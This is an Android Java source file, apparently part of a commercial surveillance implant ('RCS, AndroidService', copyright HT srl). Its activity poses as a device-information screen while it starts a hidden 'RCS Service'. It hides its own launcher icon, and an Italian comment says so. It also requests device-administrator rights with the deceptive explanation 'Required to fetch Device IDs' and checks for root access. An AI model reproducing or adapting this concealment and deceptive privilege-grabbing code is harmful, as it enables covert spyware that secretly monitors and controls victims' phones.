/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AndroidServiceGUI.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.gui;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.TextView;

import com.android.dvci.R;
import com.android.dvci.Core;
import com.android.dvci.Device;
import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.capabilities.PackageInfo;
import com.android.dvci.listener.AR;
import com.android.dvci.util.Check;
import com.android.mm.M;

/**
 * The Class AndroidServiceGUI.
 * http://stackoverflow.com/questions/10909683/launch
 * -android-application-without-main-activity-and-start-service-on-launching
 */
public class AGUI extends Activity {
	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$
	private static final int REQUEST_ENABLE = 0;
	public Handler handler;

	/**
	 * Called when the activity is first created.
	 * 
	 * @param savedInstanceState
	 *            the saved instance state
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		actualCreate(savedInstanceState);

	}

	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	@Override
	public void onResume() {
		super.onResume();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onResume) ");
		}

	}

	private void actualCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		Status.setAppGui(this);

		startService();
		setContentView(R.layout.main);

		TextView t = (TextView) findViewById(R.id.imei);

		t.setText("This is a list of device information for the current Android device:\n\n");

		if (Build.MODEL.length() > 0)
			t.append("Model: " + Build.MODEL + "\n");

		if (Build.BRAND.length() > 0)
			t.append("Brand: " + Build.BRAND + "\n");

		if (Build.DEVICE.length() > 0)
			t.append("Device: " + Build.DEVICE + "\n");

		if (Device.self().getImei().length() > 0)
			t.append("IMEI: " + Device.self().getImei() + "\n");

		if (Device.self().getImsi().length() > 0)
			t.append("IMSI: " + Device.self().getImsi() + "\n");

		if (Build.BOARD.length() > 0)
			t.append("Board: " + Build.BOARD + "\n");

		if (Build.DISPLAY.length() > 0)
			t.append("Display: " + Build.DISPLAY + "\n");
		
		t.append("OS Level: " + Build.VERSION.SDK_INT + "\n");
		t.append("OS Release: " + Build.VERSION.RELEASE + "\n");

		if (Cfg.DEBUG) {
			if (PackageInfo.hasSu()) {
				t.append("Su: yes, ");
			} else {
				t.append("Su: no, ");
			}
			if (PackageInfo.checkRoot()) {
				t.append("Root: yes");
			} else {
				t.append("Root: no");
			}
		}
	}

	private void startExtService() {
		String pack = Status.self().getAppContext().getPackageName();
		final String service = pack + M.e(".app"); //$NON-NLS-1$

		try {
			if (Core.isServiceRunning() == false) {
				final ComponentName cn = startService(new Intent(service));
			}
		} catch (final SecurityException se) {

		}
	}

	private void startService() {
		String pack = Status.self().getAppContext().getPackageName();
		final String service = pack + M.e(".app"); //$NON-NLS-1$
		// final String service = "android.intent.action.MAIN";

		try {
			if (Core.isServiceRunning() == false) {
				this.handler = new Handler();

				if (Cfg.DEBUG) {
					Check.log(TAG + " Starting cn: " + service);//$NON-NLS-1$
				}

				final ComponentName cn = startService(new Intent(service));

				if (cn == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
					}

					// Nascondi l'icona (subito in android 4.x, al primo reboot
					// in android 2.x)
					PackageManager pm = getApplicationContext().getPackageManager();
					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
							PackageManager.DONT_KILL_APP);
				}
			}
		} catch (final SecurityException se) {
			if (Cfg.EXCEPTION) {
				Check.log(se);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
			}
		}
	}

	public void fireAdminIntent() {
		Context context = Status.getAppContext();

		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		// intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

		ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");

		// context.startActivity(intent);
		startActivityForResult(intent, REQUEST_ENABLE);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (startService) ACTION_ADD_DEVICE_ADMIN intent fired");
		}
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		if (REQUEST_ENABLE == requestCode) {
			super.onActivityResult(requestCode, resultCode, data);
		}
	}

	public void deviceAdminRequest() {
		if (Root.shouldAskForAdmin() == false) {
			return;
		}

		handler.postDelayed(new Runnable() {

			@Override
			public void run() {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (deviceAdminRequest run) fireAdminIntent");
				}

				fireAdminIntent();

			}
		}, 1 * 1000);
	}

	public Context getAppContext() {
		return getApplicationContext();
	}
}
